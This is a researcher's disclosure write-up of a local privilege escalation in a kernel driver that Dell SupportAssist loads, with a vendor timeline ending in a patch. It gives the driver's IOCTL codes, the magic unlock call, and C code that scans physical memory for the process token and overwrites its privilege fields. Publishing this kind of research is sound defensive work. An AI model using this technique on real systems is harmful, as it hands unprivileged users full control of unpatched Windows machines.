---
categories:
- windows
- privilege escalation
- kernel
comments: false
date: "2018-05-01T22:00:00Z"
title: Dell SupportAssist Driver - Local Privilege Escalation
---

This post details a local privilege escalation (LPE) vulnerability I found 
in Dell's SupportAssist[0] tool. The bug is in a kernel driver loaded by 
the tool, and is pretty similar to bugs found by ReWolf in 
ntiolib.sys/winio.sys[1], and those found by others in ASMMAP/ASMMAP64[2].
These bugs are pretty interesting because they can be used to bypass driver
signature enforcement (DSE) ad infinitum, or at least until they're no longer
compatible with newer operating systems. 

Dell's SupportAssist is, according to the site, "(..) now preinstalled on most
of all new Dell devices running Windows operating system (..)". It's primary
purpose is to troubleshoot issues and provide support capabilities both to the
user and to Dell. There's quite a lot of functionality in this software itself,
which I spent quite a bit of time reversing and may blog about at a later date. 

## Bug

Calling this a "bug" is really a misnomer; the driver exposes this
functionality eagerly. It actually exposes a lot of functionality, much like
some of the previously mentioned drivers. It provides capabilities for reading
and writing the model-specific register (MSR), resetting the 1394 bus, and
reading/writing CMOS.

The driver is first loaded when the SupportAssist tool is launched, and the
filename is `pcdsrvc_x64.pkms` on x64 and `pcdsrvc.pkms` on x86. Incidentally, 
this driver isn't actually even built by Dell, but rather another company, 
PC-Doctor[3]. This company provides "system health solutions" to a variety of
companies, including Dell, Intel, Yokogawa, IBM, and others. Therefore, it's
highly likely that this driver can be found in a variety of other products...

Once the driver is loaded, it exposes a symlink to the device at
`PCDSRVC{3B54B31B-D06B6431-06020200}_0` which is writable by unprivileged users
on the system. This allows us to trigger one of the many IOCTLs exposed by the
driver; approximately 30. I found a DLL used by the userland agent that served
as an interface to the kernel driver and conveniently had symbol names
available, allowing me to extract the following:

```
// 0x222004 = driver activation ioctl
// 0x222314 = IoDriver::writePortData
// 0x22230c = IoDriver::writePortData
// 0x222304 = IoDriver::writePortData
// 0x222300 = IoDriver::readPortData
// 0x222308 = IoDriver::readPortData
// 0x222310 = IoDriver::readPortData
// 0x222700 = EcDriver::readData
// 0x222704 = EcDriver::writeData
// 0x222080 = MemDriver::getPhysicalAddress
// 0x222084 = MemDriver::readPhysicalMemory
// 0x222088 = MemDriver::writePhysicalMemory
// 0x222180 = Msr::readMsr
// 0x222184 = Msr::writeMsr
// 0x222104 = PciDriver::readConfigSpace
// 0x222108 = PciDriver::writeConfigSpace
// 0x222110 = PciDriver::?
// 0x22210c = PciDriver::?
// 0x222380 = Port1394::doesControllerExist
// 0x222384 = Port1394::getControllerConfigRom
// 0x22238c = Port1394::getGenerationCount
// 0x222388 = Port1394::forceBusReset
// 0x222680 = SmbusDriver::genericRead
// 0x222318 = SystemDriver::readCmos8
// 0x22231c = SystemDriver::writeCmos8
// 0x222600 = SystemDriver::getDevicePdo
// 0x222604 = SystemDriver::getIntelFreqClockCounts
// 0x222608 = SystemDriver::getAcpiThermalZoneInfo
```

Immediately the MemDriver class jumps out. After some reversing, it appeared
that these functions do exactly as expected: allow userland services to both
read and write arbitrary physical addresses. There are a few quirks, however. 

To start, the driver must first be "unlocked" in order for it to begin
processing control codes. It's unclear to me if this is some sort of hacky 
event trigger or whether the kernel developers truly believed this would 
inhibit malicious access. Either way, it's goofy. To unlock the driver, a 
simple ioctl with the proper code must be sent. Once received, the driver will 
process control codes for the lifetime of the system.

To unlock the driver, we just execute the following: 

```
BOOL bResult;
DWORD dwRet;
SIZE_T code = 0xA1B2C3D4, outBuf;

bResult = DeviceIoControl(hDriver, 0x222004, 
                          &code, sizeof(SIZE_T), 
                          &outBuf, sizeof(SIZE_T), 
                          &dwRet, NULL);
```

Once the driver receives this control code and validates the received code
(0xA1B2C3D4), it sets a global flag and begins accepting all other control
codes.

## Exploitation

From here, we could exploit this the same way rewolf did [4]: read out physical
memory looking for process pool tags, then traverse these until we identify our
process as well as a SYSTEM process, then steal the token. However, PCD
appears to give us a shortcut via `getPhysicalAddress` ioctl. If this does
indeed return the physical address of a given virtual address (VA), we can simply
find the physical of our VA and enable a couple token privileges[5] using the
`writePhysicalMemory` ioctl.

Here's how the `getPhysicalAddress` function works:

```
v5 = IoAllocateMdl(**(PVOID **)(a1 + 0x18), 1u, 0, 0, 0i64);
v6 = v5;
if ( !v5 )
  return 0xC0000001i64;
MmProbeAndLockPages(v5, 1, 0);
**(_QWORD **)(v3 + 0x18) = v4 & 0xFFF | ((_QWORD)v6[1].Next << 0xC);
MmUnlockPages(v6);
IoFreeMdl(v6);
```

Keen observers will spot the problem here; the `MmProbeAndLockPages` call is
passing in UserMode for the KPROCESSOR_MODE, meaning we won't be able to 
resolve any kernel mode VAs, only usermode addresses.

We can still read chunks of physical memory unabated, however, as the
`readPhysicalMemory` function is quite simple:

```
if ( !DoWrite )
{
  memmove(a1, a2, a3);
  return 1;
}
```

They reuse a single function for reading and writing physical memory; we'll
return to that. I decided to take a different approach than rewolf for a number
of reasons with great results.

Instead, I wanted to toggle on SeDebugPrivilege for my current process token.
This would require finding the token in memory and writing a few bytes at a
field offset. To do this, I used `readPhysicalMemory` to read chunks of memory
of size 0x10000000 and checked for the first field in a _TOKEN, TokenSource. In
a user token, this will be the string `User32`. Once we've identified this,
we double check that we've found a token by validating the TokenLuid, which we
can obtain from userland using the GetTokenInformation API.

In order to speed up the memory search, I only iterate over the addresses that
match the token's virtual address byte index. Essentially, when you convert a
virtual address to a physical address (PA) the byte index, or the lower 12 bits,
do not change. To demonstrate, assume we have a VA of 0xfffff8a001cc2060.
Translating this to a physical address then: 

```
kd> !pte  fffff8a001cc2060
                                           VA fffff8a001cc2060
PXE at FFFFF6FB7DBEDF88    PPE at FFFFF6FB7DBF1400    PDE at FFFFF6FB7E280070    PTE at FFFFF6FC5000E610
contains 000000007AC84863  contains 00000000030D4863  contains 0000000073147863  contains E6500000716FD963
pfn 7ac84     ---DA--KWEV  pfn 30d4      ---DA--KWEV  pfn 73147     ---DA--KWEV  pfn 716fd     -G-DA--KW-V

kd> ? 716fd * 0x1000 + 060
Evaluate expression: 1903153248 = 00000000`716fd060
```

So our physical address is 0x716fd060 (if you'd like to read more about 
converting VA to PA, check out this great Microsoft article[6]). Notice the
lower 12 bits remain the same between VA/PA. The search loop then boiled down 
to the following code:

```
uStartAddr = uStartAddr + (VirtualAddress & 0xfff);
for (USHORT chunk = 0; chunk < 0xb; ++chunk) {
    lpMemBuf = ReadBlockMem(hDriver, uStartAddr, 0x10000000);
    for(SIZE_T i = 0; i < 0x10000000; i += 0x1000, uStartAddr += 0x1000){
        if (memcmp((DWORD)lpMemBuf + i, "User32 ", 8) == 0){
            
            if (TokenId <= 0x0)
                FetchTokenId();

            if (*(DWORD*)((char*)lpMemBuf + i + 0x10) == TokenId) {
                hTokenAddr = uStartAddr;
                break;
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, lpMemBuf);

    if (hTokenAddr > 0x0)
        break;
}
```

Once we identify the PA of our token, we trigger two separate writes at offset
0x40 and offset 0x48, or the Enabled and Default fields of a _TOKEN. This
sometimes requires a few runs to get right (due to mapping, which I was too
lazy to work out), but is very stable.

You can find the source code for the bug [here](https://github.com/hatRiot/bugs).

## Timeline
04/05/18 - Vulnerability reported  
04/06/18 - Initial response from Dell  
04/10/18 - Status update from Dell  
04/18/18 - Status update from Dell  
05/16/18 - Patched version released (v2.2)  

## References
[0]
http://www.dell.com/support/contents/us/en/04/article/product-support/self-support-knowledgebase/software-and-downloads/supportassist\ 
[1] http://blog.rewolf.pl/blog/?p=1630
[2] https://www.exploit-db.com/exploits/39785/
[3] http://www.pc-doctor.com/
[4] https://github.com/rwfpl/rewolf-msi-exploit
[5] https://github.com/hatRiot/token-priv\
[6]
https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/converting-virtual-addresses-to-physical-addresses\
